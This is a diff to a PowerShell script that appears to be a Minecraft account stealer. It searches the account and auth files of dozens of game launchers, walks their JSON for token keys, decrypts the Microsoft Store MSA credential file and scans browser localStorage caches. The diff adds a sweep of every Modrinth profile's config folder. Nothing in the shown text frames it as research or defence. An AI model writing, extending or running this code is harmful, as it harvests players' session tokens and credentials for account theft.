@@ -39,7 +39,6 @@ function Scan-File {
         if(-not $raw){ return }
         try{
             $j = $raw | ConvertFrom-Json
-            # walk every object lookin for token keys
             $stack = New-Object System.Collections.Stack
             $stack.Push($j)
             while($stack.Count -gt 0){
@@ -72,28 +71,36 @@ function Scan-File {
     }catch{}
 }
 
-# 1. known launcher files
+# ---------- 1. known launcher files ----------
 $paths = @(
+    # vanilla / official
     "$env:APPDATA\.minecraft\launcher_accounts.json",
     "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
     "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
     "$env:APPDATA\.minecraft\TlauncherProfiles.json",
+    # vaultkey
     "$env:APPDATA\.minecraft\VaultKey\accounts.json",
     "$env:APPDATA\.minecraft\VaultKey\profiles.json",
     "$env:APPDATA\.minecraft\VaultKey\msa.json",
     "$env:APPDATA\.minecraft\VaultKey\auth.json",
+    # lunar
     "$env:APPDATA\.lunarclient\settings\game\accounts.json",
     "$env:APPDATA\.lunarclient\accounts.json",
+    # technic / feather
     "$env:APPDATA\.technic\oauth\accounts.json",
     "$env:APPDATA\.feather\accounts.json",
+    # prism / multimc / polly
     "$env:APPDATA\PrismLauncher\accounts.json",
     "$env:APPDATA\MultiMC\accounts.json",
     "$env:APPDATA\PollyMC\accounts.json",
+    # modrinth
     "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
     "$env:APPDATA\ModrinthApp\launcher_accounts.json",
     "$env:APPDATA\ModrinthApp\launcher_profiles.json",
+    # xmcl
     "$env:APPDATA\xmcl\user.json",
     "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
+    # others
     "$env:APPDATA\.salwyrr\accounts.json",
     "$env:APPDATA\.sklauncher\accounts.json",
     "$env:APPDATA\Badlion Client\accounts.json",
@@ -108,7 +115,7 @@ foreach($p in $paths){
     if(Test-Path $p){ Scan-File $p "unknown" }
 }
 
-# 2. decrypt msa bin
+# ---------- 2. decrypt msa bin ----------
 $bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
 if(Test-Path $bin){
     try{
@@ -119,7 +126,7 @@ if(Test-Path $bin){
     }catch{}
 }
 
-# 3. deep scan launcher roots
+# ---------- 3. deep scan launcher roots ----------
 $roots = @(
     "$env:APPDATA\.minecraft",
     "$env:APPDATA\.lunarclient",
@@ -134,7 +141,16 @@ $roots = @(
     "$env:APPDATA\PollyMC"
 )
 
-$includeNames = @("accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","user-profiles.json","tl_accounts.json","*.auth.json","minecraft_auth.json")
+$includeNames = @(
+    "accounts.json",
+    "launcher_accounts.json",
+    "launcher_accounts_microsoft_store.json",
+    "user.json",
+    "user-profiles.json",
+    "tl_accounts.json",
+    "*.auth.json",
+    "minecraft_auth.json"
+)
 
 foreach($r in $roots){
     if(-not (Test-Path $r)){ continue }
@@ -142,16 +158,13 @@ foreach($r in $roots){
         Get-ChildItem $r -Recurse -File -Include $includeNames -EA 0 | %{
             if($_.FullName -match "webcache|node_modules|\.git\\"){ return }
             if($_.Length -gt 1mb){ return }
-            # capture path OUTSIDE inner loop (bug fix)
-            $fp = $_.FullName
-            Scan-File $fp "unknown"
+            Scan-File $_.FullName "unknown"
         }
     }catch{}
 }
 
-# 4. modpack profiles
+# ---------- 4. modpack profiles ----------
 $profileRoots = @(
-    "$env:APPDATA\ModrinthApp\profiles",
     "$env:APPDATA\PrismLauncher\instances",
     "$env:APPDATA\MultiMC\instances",
     "$env:APPDATA\.minecraft\config",
@@ -163,13 +176,33 @@ foreach($pr in $profileRoots){
     try{
         Get-ChildItem $pr -Recurse -File -Include "opsec-accounts.json","accounts.json","*.auth.json" -EA 0 | %{
             if($_.Length -gt 1mb){ return }
-            $fp = $_.FullName
-            Scan-File $fp "unknown"
+            Scan-File $_.FullName "unknown"
         }
     }catch{}
 }
 
-# 5. chromium localstorage - size filter BEFORE cap
+# ---------- 4b. modrinth root cache + every profile config ----------
+$modrinthRoot = "$env:APPDATA\ModrinthApp"
+if(Test-Path $modrinthRoot){
+    # main login (real launcher auth)
+    $mainAuth = "$modrinthRoot\caches\metadata\minecraft_auth.json"
+    if(Test-Path $mainAuth){ Scan-File $mainAuth "unknown" }
+
+    # every profile's config folder (opsec, per-profile auth, etc)
+    $profilesDir = "$modrinthRoot\profiles"
+    if(Test-Path $profilesDir){
+        Get-ChildItem $profilesDir -Directory -EA 0 | %{
+            $cfg = Join-Path $_.FullName "config"
+            if(-not (Test-Path $cfg)){ return }
+            Get-ChildItem $cfg -Recurse -File -Include "minecraft_auth.json","accounts.json","opsec-accounts.json","*.auth.json" -EA 0 | %{
+                if($_.Length -gt 1mb){ return }
+                Scan-File $_.FullName "unknown"
+            }
+        }
+    }
+}
+
+# ---------- 5. chromium localstorage ----------
 $webcaches = @(
     "$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb",
     "$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb",
